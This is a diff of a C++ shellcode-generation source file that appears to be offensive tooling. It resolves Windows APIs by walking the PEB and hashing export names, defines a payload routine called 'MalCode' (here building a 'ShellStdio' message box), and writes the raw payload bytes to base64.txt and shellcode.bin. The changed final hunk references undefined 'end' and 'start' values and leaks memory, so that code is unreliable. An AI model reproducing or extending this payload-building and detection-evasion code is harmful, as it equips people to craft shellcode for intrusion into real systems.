@@ -14,7 +14,7 @@ namespace ScStdio {
 #ifndef _WIN64
 	__declspec(naked) void MalCodeBegin() { __asm { jmp MalCode } };
 #else
-	void MalCodeBegin() { MalCode(); }
+	void MalCodeBegin() { reinterpret_cast<void(__stdcall*)()>(MalCode)(); }
 #endif
 
 	PPEB getPEB() {
@@ -35,11 +35,11 @@ namespace ScStdio {
 		return (c >= 'a') ? (c - ('a' - 'A')) : c;
 	}
 
-	constexpr DWORD ct_hash(const char *str, DWORD sum = 0) {
+	constexpr DWORD ct_hash(const char* str, DWORD sum = 0) {
 		return *str ? ct_hash(str + 1, ct_ror(sum) + ct_upper(*str)) : sum;
 	}
 
-	DWORD rt_hash(const char *str) {
+	DWORD rt_hash(const char* str) {
 		DWORD h = 0;
 		while (*str) {
 			h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
@@ -49,36 +49,36 @@ namespace ScStdio {
 		return h;
 	}
 
-	LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
+	LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr) {
 		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-		return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
+		return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
 	}
 
 	PVOID getProcAddrByHash(DWORD hash) {
-		PEB *peb = getPEB();
-		LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
-		LIST_ENTRY *ptr = first;
+		PEB* peb = getPEB();
+		LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
+		LIST_ENTRY* ptr = first;
 		do {
-			LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
+			LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
 			ptr = ptr->Flink;
 
-			BYTE *baseAddress = (BYTE *)dte->DllBase;
+			BYTE* baseAddress = (BYTE*)dte->DllBase;
 			if (!baseAddress)
 				continue;
-			IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
-			IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader->e_lfanew);
+			IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
+			IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
 			DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
 			if (!iedRVA)
 				continue;
-			IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
-			char *moduleName = (char *)(baseAddress + ied->Name);
+			IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);
+			char* moduleName = (char*)(baseAddress + ied->Name);
 			DWORD moduleHash = rt_hash(moduleName);
-			DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
+			DWORD* nameRVAs = (DWORD*)(baseAddress + ied->AddressOfNames);
 			for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
-				char *functionName = (char *)(baseAddress + nameRVAs[i]);
+				char* functionName = (char*)(baseAddress + nameRVAs[i]);
 				if (hash == moduleHash + rt_hash(functionName)) {
-					WORD ordinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
-					DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
+					WORD ordinal = ((WORD*)(baseAddress + ied->AddressOfNameOrdinals))[i];
+					DWORD functionRVA = ((DWORD*)(baseAddress + ied->AddressOfFunctions))[ordinal];
 					return baseAddress + functionRVA;
 				}
 			}
@@ -97,7 +97,7 @@ namespace ScStdio {
 	typedef decltype(function) type_##function; \
 	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)
 
-	VOID __stdcall MalCode(char * msg) {
+	VOID __stdcall MalCode(char* msg) {
 
 		CHAR strUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
 		CHAR strMboxTitle[] = { 'S','h','e','l','l','S','t','d','i','o', 0 };
@@ -174,19 +174,11 @@ namespace ScStdio {
 		fs.open("base64.txt");
 		fs << Encode((const unsigned char*)&MalCodeBegin, ((DWORD)&MalCodeEnd - (DWORD)&MalCodeBegin));
 		fs.close();
-		DWORD dwWritten;
-		HANDLE FileHandle = CreateFileW(L"shellcode.bin", GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
-
-		if (!FileHandle)
-			return false;
-
-		if (WriteFile(FileHandle, &MalCodeBegin, ((DWORD)&MalCodeEnd - (DWORD)&MalCodeBegin), &dwWritten, NULL))
-		{
-			CloseHandle(FileHandle);
-			return true;
-		}
-
-		CloseHandle(FileHandle);
+		fs.open("shellcode.bin");
+		char* shellcode = new char[end - start];
+		memcpy(shellcode, &MalCodeBegin, end - start);
+		fs.write(shellcode, end - start);
+		fs.close();
 		return false;
 	}
 }
